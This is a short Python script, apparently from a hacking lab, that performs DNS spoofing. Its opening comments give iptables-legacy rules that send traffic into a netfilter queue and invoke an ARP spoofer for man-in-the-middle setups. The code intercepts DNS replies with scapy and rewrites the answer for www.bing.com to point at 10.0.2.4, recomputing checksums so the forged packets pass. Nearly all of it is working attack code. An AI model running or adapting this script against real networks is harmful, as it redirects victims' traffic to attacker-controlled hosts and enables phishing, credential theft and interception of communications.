# on localhost, spoofs local traffic to remote system
# sudo iptables-legacy -I OUTPUT -j NFQUEUE --queue-num 0
# sudo iptables-legacy -I INPUT -j NFQUEUE --queue-num 0
# sudo iptables-legacy --flush
# 
# for MITM, spoof remote traffic on remote system
# sudo iptables-legacy -I FORWARD -j NFQUEUE --queue-num 0
# sudo ../arp_spoofer/main.py

from netfilterqueue import NetfilterQueue
import scapy.all as scapy


def process_packet(packet):
    #print(packet.get_payload())
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if tgt_url in str(qname):
            print(f"\r[+] Spoofing target", end="")
            answer = scapy.DNSRR(rrname=qname, rdata=spoof_host)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            try:
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum
            except IndexError:
                #pass
                print("\n[-] protocol error stuff")

            packet.set_payload(bytes(scapy_packet))
        #print(scapy_packet.show())
    packet.accept()
    return


tgt_url = "www.bing.com"
spoof_host = "10.0.2.4"

try:
    queue = NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C ... Sharting, please wait.")
